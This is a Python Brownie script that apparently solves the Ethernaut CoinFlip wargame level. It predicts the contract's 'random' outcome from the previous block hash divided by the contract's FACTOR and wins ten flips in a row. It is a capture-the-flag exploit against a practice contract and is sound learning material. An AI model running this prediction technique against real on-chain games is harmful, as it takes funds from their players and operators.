from turtle import circle
from scripts.helper.context import *
from scripts.helper.account import _from, acc
from scripts.helper.web3 import web3
from brownie import CoinFlip

#########################################
# This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
#########################################

# get block hash as integer from block number
def get_block_value(block_number):
    return int(web3.eth.get_block(block_number)['hash'].hex(), 16)

# solve the challenge
def solve_challenge():
    # load challenge
    coinflip = load_challenge(ContractObject=CoinFlip, instance_key='coinflip')

    # define the factor variable used by the contract
    factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968

    # do one flip
    first_flip = coinflip.flip(0, _from)

    # run a loop where we obtain what we should guess
    # by dividing the expected block number - 1
    # by the FACTOR defined in the contract
    for i in range(10):
        # get block number of the first failed or successful flip
        if i == 0:
            block_num = first_flip.block_number
        else:
            block_num = next_flip.block_number

        # get the block value
        block_value = get_block_value(block_num)
        # obtain value to guess
        print(block_value/factor)
        guess = int(block_value/factor)

        # perform the flip which should be successful
        next_flip = coinflip.flip(guess, _from)

        # consecutive wins
        print(f"there's been {coinflip.consecutiveWins()} consecutive wins")

    # check if there's been 10 consecutive wins
    wins_assertion = coinflip.consecutiveWins() == 10
    print(wins_assertion)

    return wins_assertion

def main():
    solve_challenge()
